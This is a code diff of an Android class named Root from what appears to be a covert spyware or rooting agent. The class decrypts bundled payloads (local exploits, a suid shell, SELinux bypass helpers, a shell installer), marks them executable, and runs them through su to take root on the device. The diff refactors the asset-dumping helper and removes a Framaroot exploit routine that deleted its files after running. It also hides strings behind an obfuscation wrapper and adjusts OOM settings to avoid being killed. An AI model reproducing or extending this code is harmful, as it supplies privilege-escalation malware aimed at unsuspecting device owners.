@@ -18,7 +18,6 @@ import com.android.mm.M;
 
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -290,10 +289,9 @@ public class Root {
 
 		final AutoFile suidext = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 		// suidext
-
 		try {
-			InputStream streamS = Utils.getAssetStream(M.e("sb.data"));
-			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
+			Utils.dumpAsset(M.e("sb.data"), suidext.getName());
+
 			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);
 
 			ExecuteResult res = Execute.execute(new String[]{SU, "-c", suidext.getFilename() + " rt"});
@@ -332,14 +330,8 @@ public class Root {
 		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 
 		try {
-
-			// selinux_suidext
-			InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
-			// shell_installer.sh
-			InputStream streamK = Utils.getAssetStream(M.e("kb.data"));
-
-			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
-			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
+			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());// selinux_suidext
+			Utils.dumpAsset(M.e("kb.data"), shellInstaller.getName());// shell_installer.sh
 
 			if (Cfg.DEBUG) {
 				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
@@ -388,10 +380,8 @@ public class Root {
 		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("comp")); // selinux_suidext
 
 		try {
-
 			// selinux_suidext
-			InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
-			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
+			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());
 
 			if (Cfg.DEBUG) {
 				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
@@ -456,22 +446,14 @@ public class Root {
 		if ((android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.FROYO || android.os.Build.VERSION.SDK_INT > 17)) {
 			return false;
 		}
-		// preprocess/expl_check
-		InputStream stream = Utils.getAssetStream(M.e("hb.data"));
-		Check.asserts(stream != null, "Null asset");
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkFramarootExploitability) ");
 		}
 
 		try {
-			boolean written = fileWrite(exploitCheck, stream, Cfg.RNDDB);
-			if (!written) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (checkFramarootExploitability), cannot write file");
-				}
-				return false;
-			}
+			// preprocess/expl_check
+			Utils.dumpAsset(M.e("hb.data"), exploitCheck);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 			int ret = Execute.execute(path + M.e("/ec")).exitCode;
 
@@ -511,12 +493,9 @@ public class Root {
 			Check.log(TAG + " (checkSELinuxExploitability) ");
 		}
 
-		// preprocess/selinux_check
-		InputStream stream = Utils.getAssetStream(M.e("db.data"));
-
 		try {
-			fileWrite(exploitCheck, stream, Cfg.RNDDB);
-
+			// preprocess/selinux_check
+			Utils.dumpAsset(M.e("db.data"), exploitCheck);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
 			int ret = Execute.execute(path + M.e("/ecs")).exitCode;
 
@@ -543,52 +522,6 @@ public class Root {
 		}
 	}
 
-	static public boolean framarootExploit() {
-		final File filesPath = Status.getAppContext().getFilesDir();
-		final String path = filesPath.getAbsolutePath();
-		final String localExploit = M.e("l");
-		// preprocess/local_exploit
-		InputStream stream = Utils.getAssetStream(M.e("lb.data"));
-
-		try {
-			fileWrite(localExploit, stream, Cfg.RNDDB);
-
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
-
-			// Unpack the suid shell
-			final String suidShell = M.e("ss"); // suid shell
-			// preprocess/suidext
-			InputStream shellStream = Utils.getAssetStream(M.e("sb.data"));
-
-			fileWrite(suidShell, shellStream, Cfg.RNDDB);
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
-
-			// Create the rooting script
-			String pack = Status.getAppContext().getPackageName();
-			Execute.execute(String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack));
-
-			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
-			file.delete();
-
-			file = new File(Status.getAppContext().getFilesDir(), suidShell);
-			file.delete();
-
-			return true;
-		} catch (final Exception e1) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e1);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (framarootExploit): Exception"); //$NON-NLS-1$
-			}
-
-			return false;
-		}
-	}
-
-
 	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux) {
 
 		// Start exploitation thread
@@ -600,7 +533,7 @@ public class Root {
 			Check.log(TAG + "(linuxExploit): exploitation thread running");
 		}
 
-		if(synchronous){
+		if (synchronous) {
 			try {
 				exploit.join();
 				PackageInfo.checkRoot();
@@ -673,6 +606,7 @@ public class Root {
 			}
 		}
 	}
+
 	/*
 	 * Removed synchronized in favour of using a semaphore,
 	 * With synchronized two successive calls at the same method
@@ -690,7 +624,7 @@ public class Root {
 			}
 			return false;
 		}
-		try{
+		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
 						+ Keys.self().wantsPrivilege());
@@ -735,38 +669,10 @@ public class Root {
 
 			// Avoid having the process killed for using too many resources
 			Root.adjustOom();
-		}finally{
+		} finally {
 			semGetPermission.release();
 		}
 		return Status.haveRoot();
-	}
-
-	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException {
-		try {
-			InputStream in = decodeEnc(stream, passphrase);
-
-			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
-			byte[] buf = new byte[1024];
-			int numRead = 0;
-
-			while ((numRead = in.read(buf)) >= 0) {
-				out.write(buf, 0, numRead);
-			}
-
-			out.close();
-		} catch (Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (fileWrite): " + ex);
-			}
-
-			return false;
-		}
-
-		return true;
 	}
 
 	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
@@ -884,7 +790,7 @@ public class Root {
 			// TODO riabilitare le righe quando si reinserira' l'exploit
 			// InputStream manifestApkStream =
 			// getResources().openRawResource(R.raw.layout);
-			// fileWrite(manifest, manifestApkStream,
+			// streamDecodeWrite(manifest, manifestApkStream,
 			// Cfg.);
 
 			// Copiamolo in /data/app/*.apk
